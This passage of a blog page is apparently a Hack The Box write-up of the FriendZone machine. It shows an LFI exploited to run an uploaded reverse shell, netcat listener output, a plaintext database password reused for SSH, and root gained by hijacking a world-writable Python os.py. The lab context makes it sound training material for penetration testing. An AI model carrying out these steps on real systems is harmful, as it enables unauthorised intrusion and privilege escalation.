MD/icTtGKcprfIAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/ee58024cc6d33649098f4ac8f873156a/a59e9/friendzone_80.webp 192w,
+/static/ee58024cc6d33649098f4ac8f873156a/0ca9f/friendzone_80.webp 384w,
+/static/ee58024cc6d33649098f4ac8f873156a/dc9b9/friendzone_80.webp 768w,
+/static/ee58024cc6d33649098f4ac8f873156a/b3a9a/friendzone_80.webp 903w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/ee58024cc6d33649098f4ac8f873156a/3b721/friendzone_80.png 192w,
+/static/ee58024cc6d33649098f4ac8f873156a/66595/friendzone_80.png 384w,
+/static/ee58024cc6d33649098f4ac8f873156a/fe486/friendzone_80.png 768w,
+/static/ee58024cc6d33649098f4ac8f873156a/8728b/friendzone_80.png 903w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/ee58024cc6d33649098f4ac8f873156a/fe486/friendzone_80.png"
+            alt="Friendzone_80"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>I tried to enumerate subdirectories, but couldn’t find one. Subdomains didn’t work here neither. So maybe we should try https.</p>
+<h3>2.4 <a href="https://friendzone.red" target="_blank" rel="nofollow">https://friendzone.red</a></h3>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/4abf01ec907026d53bf67b02deff7f0d/2b3a9/friendzone_443.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 86.97916666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAA7DAAAOwwHHb6hkAAADE0lEQVR42nWU21PTQBTGo46+ADJFREoZKJQ2JGmaZHeTtIoKtLRQeqECohYYxuHBJ31wdHC8/AUCVZnxivqffp5sUsDbw2++s2fPfN1tv63CbA+LlRqarQ0sVBq4PlOC590Gd2dgswL0nICq2UirOSRTOsZTGsYmpjE2GSmhGQ7N5iG8GSjLjXVU6+uorbSxvNREdb5Kxk2UaxtYpv4SfUipuIT5hRqKc2UUAy1VqbeIEu0tVOooL99Fo3UP1dodKJZtw3EYmMMJBpdRLQQc7kZ9Bs4FGOcnddAXtBbCJQRsmxMMZs6Cous6AgwjIEs1oenIZk3U6w2srLTQaDTRurMqtVyuoEk9Xc4aEsMgAg9CkQtCJzRNJbMMQaqrZKpJzDN013LmDEZkLA2DE1qWhcJMBfkbS+BeETafhcVmpYb1nFwHOGLuD27DNM2uYVaeyitUcC3bQSxziAH1AEPGO8TN99QLGSYS1gfZG9Q6NHMoiWU6GLU7cP0i3TDTNUzDzddxKf4OypUDKLG3GNI/Y4x/x6hzjHER6Dck3R+Y8H+iN3kEZWCfZvdx4VoHV6c/Uswq8mCR4TSEexOa/wpT/DXS4rXUsH5zwmnvlCn+Brr/Elxclz7Rd6hRLDyYYh2avQbdWYPBwjqdbf1Gdy/QgGDGFKtgzJU+0QlVunIJlwZ2oPS2ce7yJpSeNnqGd5Fmz5HMPUXKeYZJ+xkuRjNK36bU8/3buJJ8RFeelT5nDOcRG99BT3wTfYktqYMTD6HyJ8iwx5gWT2QdG9tB78gW+gipiW0k1F16dre6huGVHXop7o0H4IU2bP8+HP8BbO8+XW8DWX6XNCToyf18OMvybdIN+Xr0MNjd2CziqnaIvtQBRnIfKApHYVQiDXoJ6wgjFJtR0iGKzuXUPvqnDmVsxF+xKVBsEu+hDO5T7j5j0v+BYfMLGX6VGre+YpQdU5SOkaK9Qe0Tzb7FhXiHaoqN90dsgr8r3d9Dmr/AFNujH2HvRNMs7HXp9jKC+jSv+89/j034uIM3qkpyEeY/9H+Efy4GfgEd4DTNmzSPmQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/4abf01ec907026d53bf67b02deff7f0d/a59e9/friendzone_443.webp 192w,
+/static/4abf01ec907026d53bf67b02deff7f0d/0ca9f/friendzone_443.webp 384w,
+/static/4abf01ec907026d53bf67b02deff7f0d/dc9b9/friendzone_443.webp 768w,
+/static/4abf01ec907026d53bf67b02deff7f0d/d4c96/friendzone_443.webp 884w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/4abf01ec907026d53bf67b02deff7f0d/3b721/friendzone_443.png 192w,
+/static/4abf01ec907026d53bf67b02deff7f0d/66595/friendzone_443.png 384w,
+/static/4abf01ec907026d53bf67b02deff7f0d/fe486/friendzone_443.png 768w,
+/static/4abf01ec907026d53bf67b02deff7f0d/2b3a9/friendzone_443.png 884w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/4abf01ec907026d53bf67b02deff7f0d/fe486/friendzone_443.png"
+            alt="Friendzone_443"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>And I tried also administrator1.friendzone.red which we found on the DNS stage.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/979804199dd55e9174e7d1d5820a463a/79586/admin1.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 84.89583333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC6UlEQVR42r2T208TeRSA+19ovOOKLgKaGKuCFwSLxEgWjVagTClyaW1l0WxUtEBbhCrgJWZj4oO6yT7tGo1iYoReZ0AFLw9kE8Bkd3lQUbNeqoGkaEr4PAzGJx/oy07yTc7vJOebM/mdY0hZ/AM/pqWSujKN1BUZLFuezsKlaaxeswFTQRE5pp3kmXaweWs+KctWMmfeYubOX/KNeQtSWCCOhYuWsmSFEUPulp2Y8ooo2L6H3JxCsozbMArrjCbWrzORvT6fnM2FZG/Yzqr0bDIzNpKZnsWqzE1kyNm41kTu1p/Iz9tFXu4uDA5fOc6TVbj8Dg5K/LNXwdFSicNfjb1ZweVTcLbaJLZg9xZjb1GoaTJT01wmWKjwWKiU2OrejaW+CMOFh4c431/LuT4XZ4X2PicdDxy03a+hRa2kWa3AF7HRHC3HG1FoClnw9ih4NQserZQmrYRGdR8Nmhm3thfDmZ46OrRa2rWDtKsuTqsHdPwRO+6bVty3FE5M01nGseslHLleTGNXmYjLaAxaaAiU4A4Uc6LbTH23CM/21nGmp5aOHhFqLto0pwgd+MI2PGFFkMJwKQ0hKQxJYdDM8YB5RhiSfFDyQclLrj7wXeFMh38O/Mqd4d+5PfQbnYNXhSvcGrysx38MXMATUuQjsxVGD/AiNgJTMPl5Ul7oTCUkIc/b8dd4g+V617MWPo/9Szw+wZvYGz6Of9SJjcWIT0hu7JUIbckJpzuc+gzx8TiTnxLCJImJBCSS7PC0CNtUJyNvn3Jx4BJ1kcO47zXRcN/DoegvtD85x/MPI/hCFcl06OTZ+38Yjv1N7+gD+l8/1rn3so+/3g3x39hokr8stxwYvsbQ6BOGXjwSHjKo06+fw09v4AlaZ3vLX+cwZMPdXSoDW8Lx7mLqu8wc69rL0bu79QFOYg5nhKc0B361hla1WlawipPR/bJ+02tYjidiTV7oV+20RkUWnZbJTkdmdtobtuob9L8JvwDlwXu4b9KrvwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/979804199dd55e9174e7d1d5820a463a/a59e9/admin1.webp 192w,
+/static/979804199dd55e9174e7d1d5820a463a/0ca9f/admin1.webp 384w,
+/static/979804199dd55e9174e7d1d5820a463a/dc9b9/admin1.webp 768w,
+/static/979804199dd55e9174e7d1d5820a463a/21cee/admin1.webp 932w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/979804199dd55e9174e7d1d5820a463a/3b721/admin1.png 192w,
+/static/979804199dd55e9174e7d1d5820a463a/66595/admin1.png 384w,
+/static/979804199dd55e9174e7d1d5820a463a/fe486/admin1.png 768w,
+/static/979804199dd55e9174e7d1d5820a463a/79586/admin1.png 932w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/979804199dd55e9174e7d1d5820a463a/fe486/admin1.png"
+            alt="admin1"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>I tried to use the credential which we obtained from SMB share, and got:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">Login Done ! visit /dashboard.php</code></pre></div>
+<p>Visiting dashboard.php:</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/26530/lfi1.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 66.14583333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABpUlEQVR42rVSWUtCQRi9/6MsytTKbuVumVfTi5H10A8WkrtavZr7k/uuuODuaWagICihqIHDnPnmm8N3DsNZTFacnfLgbXZYTxw4tNqwf3AMh8sHMXKPkBiFELzB5VUYJjMPw64Z2zsmbBkOGPaMRzASDcsRD8uZAE4IRhAM3SEceYAgiPC6/XB4Q7B7rmFz+uB2+XHhE+HyBOAk3OkO4PTcQwa4AH/uhedSRDAcJRq38Aci4OJxCbKsQVISUCQFCQJJfYKqv0BRNeiKBlUjd4oKVVFITYcmy9ATz9A0HXFJhyTriMUeGTj88eJmsxmmBHO6T6fI5/NIp9N4fU2hUCggn8shm80ynkqlkEwmGc+Req1Ww3w+Z+8mkwmoFtfv99FqtdDtdtFoNFAsFlEqlVgz3cvlMjKZDBOhvFqtolKpsDvaW6/X0Ww2Wb3X631teb1efzrTKZbL5caeD8ub8hiPxxgOhwyj0QiDwYDZ25jhV8XVasWmohFQ69QS5dQWjWexWPxsQhowzbTdbjNQkfes6LnT6TDRH1v+1bf5zaPv7P7LhG+EF48xq+pGTwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/a59e9/lfi1.webp 192w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/0ca9f/lfi1.webp 384w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/dc9b9/lfi1.webp 768w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/3d89b/lfi1.webp 944w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/3b721/lfi1.png 192w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/66595/lfi1.png 384w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/fe486/lfi1.png 768w,
+/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/26530/lfi1.png 944w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/7e81c1bb2c1ddf4ea8df6a9d7566929f/fe486/lfi1.png"
+            alt="lfi1"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>It is pretty obious that we have some kind of LFI or Injection, since we have 2 parameters. After struggling a while, I could find out that pagename may potentially cause a problem:</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/03d95f1778e81a556ae4012b766a5349/e3807/lfi2.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 59.375%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB6ElEQVR42pWRy08TURTG5w9gpyhIGhW7ICGREBJC4kI3xpXKxrhix8IVCSHuNIawYac82unMxIq6J6zduXUBMW6q0Hm001taph3aGdrp8/Oem7ZJtZZ4k1/OnHu+c+c8pKmZWYSnZhAKhTF9dx7zCw8wO3cPk+Fp3Ji4g/GJScEYMX4b18Zu4cpoaCBXr9+EFIvFoWof8V6LI8q/d3cVRCIKorIGWVY5GhT1A2RlD5Goih0e395ROjaGd1vRPiRcclqtFiqViqAWBAiCKrdVVKvc1mpot9t9eokSBlEulwX5fB62bSOVTiNxcoKjhIEfxxYs7tN9oVBAsVhEqVQSedKwyprNJuqNhvCTuXMsbH7B/Td7eLz5GcdnnrinOOlILyq8tOVOS4mMg/DaBlbXH+LZ8hMcZWp98V7Lgx6huXRbb3b+/Ou0hMW3Mg6UFajxDehnxV4npO8i/fkQHZqJaZqwLEvMKZs95TA4rgebFZDLZZGx02CMCUiXSqXg+/7wCsnSfDzPg8fFlQvCg899SqbNd+fX1f9zhpRAOI4DwzAEup6EbphI6jpM7lNlruuKDZN26FJ6W67Xhc9cH68ODrHy6Ste738DO7+gXsSWGx3+a8s/mYORFxqevlzCo+Xn+M6Cv7ZMBfwGyI1Hj8wY55cAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/03d95f1778e81a556ae4012b766a5349/a59e9/lfi2.webp 192w,
+/static/03d95f1778e81a556ae4012b766a5349/0ca9f/lfi2.webp 384w,
+/static/03d95f1778e81a556ae4012b766a5349/dc9b9/lfi2.webp 768w,
+/static/03d95f1778e81a556ae4012b766a5349/e2c2f/lfi2.webp 1152w,
+/static/03d95f1778e81a556ae4012b766a5349/90a49/lfi2.webp 1517w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/03d95f1778e81a556ae4012b766a5349/3b721/lfi2.png 192w,
+/static/03d95f1778e81a556ae4012b766a5349/66595/lfi2.png 384w,
+/static/03d95f1778e81a556ae4012b766a5349/fe486/lfi2.png 768w,
+/static/03d95f1778e81a556ae4012b766a5349/d2d74/lfi2.png 1152w,
+/static/03d95f1778e81a556ae4012b766a5349/e3807/lfi2.png 1517w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/03d95f1778e81a556ae4012b766a5349/fe486/lfi2.png"
+            alt="lfi2"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>Since we had dashboard.php, this shows that ./php_filename_without_extension would call php_filename_without_extension.php</p>
+<p>So, if we can somehow upload a revshell.php and access it via LFI vector, we could obtain a revshell.</p>
+<h2>3. Initial Foothold</h2>
+<p>I remebered that we had a write permission on /Development in SMB part. After googling, I found out how to reveal an absolute path of a SMB share.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/oscp/htb-box/friendzone]
+└─$ sudo nmap 10.10.10.123 -p445 -Pn -sC --script smb-enum-shares.nse
+[sudo] password for hosan: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 16:06 EDT
+Nmap scan report for friendzone.red (10.10.10.123)
+Host is up (0.047s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.10.123\Development: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited>
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+....and so on</code></pre></div>
+<p>So we got an absolute path, a LFI vector AND a write permission. If we visit /etc/Development/test (there is test.php which only executes echo “Please subscribe”)</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/fa50d641abb1b0353edaa462e52f89db/71647/lfi3.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 44.27083333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABo0lEQVR42nVRTUsCURSdZT+kNKkUgwhTs3JSG9MKqkX/oGURRBC0i+gHtAlatWzZvq9dQUFFrUp8OlqRHzPj5+h4enccxRZeOJw79565973zBM/cOsSACOeoG+4JH2bmIvBNixh3T8Ix4oZt2Am7w8XZBTvByofszi4G7WMYtLUhSFIcC7FVSNISpNgaoos8j65gQVpGKLQIcT4KMRxHMBRHYDaCAF/oD4Th9YuY8hGC8HBMWRBUVYOqadBUFZQrisJZNWulUgka53w+jxyHyblcF8Vi0ex3dPSfgD5Rq9VQr9fNBSyZRIoxZGQZspxCOp0yv7PZLCqVCsrlsqml6DtQ13VTVKlW0Wo2kP5VcHj5iIOLe5xevyGnlqHzPi2uck2j0eg/sNVqmaBoGm1+ZV8Y2DzB6t4GYju7YEWjq+3lvifshGENfGY/8O5v4+w4ioOjLTClaQ36rxcMwwChd0uhUEAikQAj3zIZfH9l8f7JcH7zgoe7Wzw9XuHD8pV8JJ3M/aXrC2QqedAb5AfVCJ3HqZGXfDFZUNeb7ZrVoxnEdLA/gmlU5nwC+u0AAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/fa50d641abb1b0353edaa462e52f89db/a59e9/lfi3.webp 192w,
+/static/fa50d641abb1b0353edaa462e52f89db/0ca9f/lfi3.webp 384w,
+/static/fa50d641abb1b0353edaa462e52f89db/dc9b9/lfi3.webp 768w,
+/static/fa50d641abb1b0353edaa462e52f89db/e2c2f/lfi3.webp 1152w,
+/static/fa50d641abb1b0353edaa462e52f89db/f3efb/lfi3.webp 1536w,
+/static/fa50d641abb1b0353edaa462e52f89db/c929e/lfi3.webp 1551w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/fa50d641abb1b0353edaa462e52f89db/3b721/lfi3.png 192w,
+/static/fa50d641abb1b0353edaa462e52f89db/66595/lfi3.png 384w,
+/static/fa50d641abb1b0353edaa462e52f89db/fe486/lfi3.png 768w,
+/static/fa50d641abb1b0353edaa462e52f89db/d2d74/lfi3.png 1152w,
+/static/fa50d641abb1b0353edaa462e52f89db/e8464/lfi3.png 1536w,
+/static/fa50d641abb1b0353edaa462e52f89db/71647/lfi3.png 1551w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/fa50d641abb1b0353edaa462e52f89db/fe486/lfi3.png"
+            alt="lfi3"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>We can indeed see that test.php is being executed.</p>
+<p>Now, everything combined:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 57610
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 23:21:26 up  1:43,  0 users,  load average: 0.00, 0.00, 0.75
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data</code></pre></div>
+<p>I got a revshell. So there was only three steps:</p>
+<ol>
+<li>Modify rev.php and upload it</li>
+<li>Open port to listen incoming connection</li>
+<li>Visit our rev.php with LFI vector : pagename=/etc/Development/rev</li>
+</ol>
+<h2>4. Privilege Escalation</h2>
+<p>Even if www-data already gives us the user flag, I found a credential of the user friend:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ cd /var/www
+$ ls
+admin
+friendzone
+friendzoneportal
+friendzoneportaladmin
+html
+mysql_data.conf
+uploads
+$ cat mysql_data.conf     
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ</code></pre></div>
+<p>And I could use it for ssh connection.</p>
+<h3>4.1 pspy</h3>
+<p>After downloading pspy on our victim host,</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">2024/08/16 23:40:01 CMD: UID=0    PID=3203   | /usr/bin/python /opt/server_admin/reporter.py 
+2024/08/16 23:40:01 CMD: UID=0    PID=3202   | /bin/sh -c /opt/server_admin/reporter.py 
+2024/08/16 23:40:01 CMD: UID=0    PID=3201   | /usr/sbin/CRON -f </code></pre></div>
+<p>I found this suspicious reporter.py</p>
+<h3>4.2 python library hijiacking</h3>
+<p>reporter.py imports os, but <strong>does not use it</strong>. So I couldn’t modify the script to execute some commands. (I also didn’t have write privielge) After searching for a while, I noticed there is a potential risk if a non-privileged user can modify the library itself.</p>
+<blockquote>
+<p>So I looked after /usr/lib/python2.7/os.py:</p>
+</blockquote>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py</code></pre></div>
+<p>The mechanism is pretty simple:</p>
+<ol>
+<li>Loading python module is actually compiling it.</li>
+<li>So if we modify os.py, modified part of code will be executed every time os is being imported.</li>
+<li>We can simply add some scripts at the end of the os.py!</li>
+</ol>
+<p>So I modified the end of the file like this:</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/7cf84cfae4fdd657f377eec64d6b63bc/43dd6/os_modify.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABL0lEQVR42m1RW3KDMAzMTfIyYMcvjDGEpsk0E9pp73+g7dok7aTTjx0JJK+0q5UNE9pugrM9vOlhDxFWM7cJxg5QzDWjcSNcO6FRHaraY1+5O5Z8J2zB6jDM8N0JRnaIbIyNR1c7tGxSzEXTorqjli327FmztslkdQshwzPhJnyiCTNkN8OkG0L/CmkSNrnhZ4vlwVY4NMwHYRD5Xf2pF0I1fiEcP+D6K+L4jj6doShb3JseD0SWSShu/yY0zsTuP8LGHIs/GZYeZRg/QeqEmn5lz0o9+0n09NZT/prkeUi25InQD9eyVUvzL/6IFz/i5AZMRFShHEXpuGxJJMptHpuJ3w23e7MQ1uHC6alAU+qBMCZC5+vSy+XKjMwHxhsHZY9zf+0HCJcg+c9SRVbzDYGk1MDxvPxOAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/7cf84cfae4fdd657f377eec64d6b63bc/a59e9/os_modify.webp 192w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/0ca9f/os_modify.webp 384w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/dc9b9/os_modify.webp 768w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/7f33c/os_modify.webp 937w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/7cf84cfae4fdd657f377eec64d6b63bc/3b721/os_modify.png 192w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/66595/os_modify.png 384w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/fe486/os_modify.png 768w,
+/static/7cf84cfae4fdd657f377eec64d6b63bc/43dd6/os_modify.png 937w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/7cf84cfae4fdd657f377eec64d6b63bc/fe486/os_modify.png"
+            alt="lfi3"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>And waited calmly… (I thought importing os in os.py would not work and tried to do it again, but it worked anyway)</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
+└─$ nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [10.10.16.14] from (UNKNOWN) [10.10.10.123] 38182
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+667053ead4657d95ce354e508e17ec07</code></pre></div>
+<p>And that’s pretty much it!</p>
+<h2>5. Review</h2>
+<p>While I didn’t mention it earlier, there were numerous rabbit holes, such as the /upload endpoint, which initially seemed like a promising vector for the initial foothold.</p>
+<p>However, this led to some challenges and required a bit of perseverance to find the correct path.</p>
+<p>Overall, this machine serves as valuable preparation for OSCP, given the extensive enumeration required.</p>
+<p>It could be improved by more clearly distinguishing between legitimate paths and false positives.</p>
+<h2>Source</h2>
+<ul>
+<li>Me!</li>
+<li>HTB 2024</li>
+</ul></div><style data-emotion="css 1ws88hl">.css-1ws88hl{width:50%;height:30px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;margin:auto;margin-bottom:50px;}@media (max-width: 768px){.css-1ws88hl{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;width:50%;text-align:center;}}</style><div class="css-1ws88hl e19uf7in2"><style data-emotion="css 170jz57">.css-170jz57{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';border:0;outline:0;background-color:white;}</style><button class="css-170jz57 e19uf7in0"><style data-emotion="css 4gq8eu">.css-4gq8eu{z-index:3;}.css-4gq8eu:hover{background-image:linear-gradient(transparent 60%, #7490b5 40%);}</style><a href="https://hosahn.github.io/240814/" class="css-4gq8eu e19uf7in1">PREV POST</a></button><button class="css-170jz57 e19uf7in0"><a href="https://hosahn.github.io/240816/" class="css-4gq8eu e19uf7in1">NEXT POST</a></button></div><style data-emotion="css hx9xpc">@media (max-width: 768px){.css-hx9xpc{padding:0 20px;}}</style><div class="css-hx9xpc e1l3qcvx0"></div><div><style data-emotion="css jtgsqn">.css-jtgsqn{display:grid;place-items:center;margin-top:200px;padding:50px 0;font-size:15px;text-align:center;line-height:1.5;color:white;background-color:black;opacity:0.7;}@media (max-width: 768px){.css-jtgsqn{font-size:13px;}}</style><footer class="css-jtgsqn e1oae0v80">Thanks for visiting my blog! If you are interested in building a CTF Team, please contact me! -Hosan Lee-<br/><a target="_blank" href="https://icons8.com/icon/37287/footman"> © 2022 Hosan Lee, Munich. Footman icon by Icons8</a></footer></div></main></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/240817/";/*]]>*/</script><!-- slice-start id="_gatsby-scripts-1" -->
+          <script
+            id="gatsby-chunk-mapping"
+          >
+            window.___chunkMapping="{\"app\":[\"/app-da827ac9a41e39ef7771.js\"],\"component---src-pages-404-tsx\":[\"/component---src-pages-404-tsx-ad927dd2a9aff9188e33.js\"],\"component---src-pages-contact-tsx\":[\"/component---src-pages-contact-tsx-f194ea3356ee679e7dae.js\"],\"component---src-pages-index-tsx\":[\"/component---src-pages-index-tsx-a178567fdb351e751e17.js\"],\"component---src-pages-search-tsx\":[\"/component---src-pages-search-tsx-3aefd81b759564cf3a56.js\"],\"component---src-templates-post-template-tsx\":[\"/component---src-templates-post-template-tsx-573c131749e9ec1fc515.js\"]}";
+          </script>
